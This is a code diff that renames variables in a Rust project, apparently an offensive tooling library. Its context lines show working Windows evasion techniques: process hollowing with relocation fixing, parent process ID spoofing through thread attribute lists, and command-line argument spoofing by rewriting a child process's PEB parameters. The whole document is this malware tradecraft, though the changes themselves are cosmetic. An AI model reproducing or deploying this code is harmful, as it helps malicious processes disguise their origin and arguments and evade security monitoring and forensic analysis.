@@ -33,7 +33,7 @@ pub fn get_current_filename() -> String {
         .expect("Failed to convert buffer to String")
 }
 
-// https://docs.microsoft.com/fr-fr/windows/win32/debug/pe-format#the-reloc-section-image-only
+// https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-reloc-section-image-only
 #[derive(Debug, Copy, Clone)]
 struct ImageRelocationEntry {
     data: u16,
@@ -46,7 +46,7 @@ impl ImageRelocationEntry {
     }
 
     // Getter for the type field
-    fn typ(&self) -> u8 {
+    fn type_(&self) -> u8 {
         (self.data >> 12) as u8
     }
 }
@@ -175,7 +175,7 @@ pub fn process_hollowing(filename: String) {
                         .add(reloc_offset)
                         as *const ImageRelocationEntry;
                     reloc_offset += size_of::<ImageRelocationEntry>();
-                    if (*image_relocation_entry).typ() == 0 {
+                    if (*image_relocation_entry).type_() == 0 {
                         continue;
                     }
                     let relocation_address_va = (*image_base_relocation).VirtualAddress as usize
@@ -241,22 +241,22 @@ pub fn apply_process_mitigation_policy() {
 
     // Get size for the LPPROC_THREAD_ATTRIBUTE_LIST
     // We only use 1 argument (the mitigation policy)
-    let mut lpsize = 0;
+    let mut lp_size = 0;
     unsafe {
         let _ = InitializeProcThreadAttributeList(
             LPPROC_THREAD_ATTRIBUTE_LIST::default(),
             1,
             0,
-            &mut lpsize,
+            &mut lp_size,
         );
     };
 
     // Create the memory needed for the attribute list
-    let mut attribute_list: Box<[u8]> = vec![0; lpsize].into_boxed_slice();
+    let mut attribute_list: Box<[u8]> = vec![0; lp_size].into_boxed_slice();
     startup_info.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attribute_list.as_mut_ptr() as _);
     // Calling InitializeProcThreadAttributeList again to initialize the list
     unsafe {
-        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lpsize);
+        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lp_size);
     };
 
     // Update the list so that it contains the PPID
@@ -304,22 +304,22 @@ pub fn spoof_ppid(ppid: u32) {
 
     // Get size for the LPPROC_THREAD_ATTRIBUTE_LIST
     // We only use 1 argument (the parent id process)
-    let mut lpsize = 0;
+    let mut lp_size = 0;
     unsafe {
         let _ = InitializeProcThreadAttributeList(
             LPPROC_THREAD_ATTRIBUTE_LIST::default(),
             1,
             0,
-            &mut lpsize,
+            &mut lp_size,
         );
     };
 
     // Create the memory needed for the attribute list
-    let mut attribute_list: Box<[u8]> = vec![0; lpsize].into_boxed_slice();
+    let mut attribute_list: Box<[u8]> = vec![0; lp_size].into_boxed_slice();
     startup_info.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attribute_list.as_mut_ptr() as _);
     // Calling InitializeProcThreadAttributeList again to initialize the list
     unsafe {
-        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lpsize);
+        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lp_size);
     };
 
     //Open handle to PPID
@@ -386,23 +386,23 @@ pub fn spoof_arguments() {
             &mut process_info
         ).expect("Could not create process");
 
-        let mut pbi = PROCESS_BASIC_INFORMATION::default();
+        let mut process_basic_info = PROCESS_BASIC_INFORMATION::default();
 
         let mut return_length = 0;
         NtQueryInformationProcess(
             process_info.hProcess,
             PROCESSINFOCLASS(0),
-            &mut pbi as *mut _ as *mut c_void,
+            &mut process_basic_info as *mut _ as *mut c_void,
             size_of::<PROCESS_BASIC_INFORMATION>() as u32,
             &mut return_length,
         );
 
         // Read PEB from new process
-        let mut peb = PEB::default();
+        let mut process_environment_block = PEB::default();
         ReadProcessMemory(
             process_info.hProcess,
-            pbi.PebBaseAddress as *const c_void,
-            &mut peb as *mut _ as *mut c_void,
+            process_basic_info.PebBaseAddress as *const c_void,
+            &mut process_environment_block as *mut _ as *mut c_void,
             size_of::<PEB>(),
             None,
         )
@@ -412,7 +412,7 @@ pub fn spoof_arguments() {
         let mut parameters = RTL_USER_PROCESS_PARAMETERS::default();
         ReadProcessMemory(
             process_info.hProcess,
-            peb.ProcessParameters as *const c_void,
+            process_environment_block.ProcessParameters as *const c_void,
             &mut parameters as *mut _ as *mut c_void,
             size_of::<RTL_USER_PROCESS_PARAMETERS>(),
             None,
@@ -431,7 +431,7 @@ pub fn spoof_arguments() {
             + size_of::<Foundation::UNICODE_STRING>();
         WriteProcessMemory(
             process_info.hProcess,
-            (peb.ProcessParameters as *const c_void).add(offset),
+            (process_environment_block.ProcessParameters as *const c_void).add(offset),
             &length as *const usize as *const c_void,
             size_of::<u16>(),
             None,
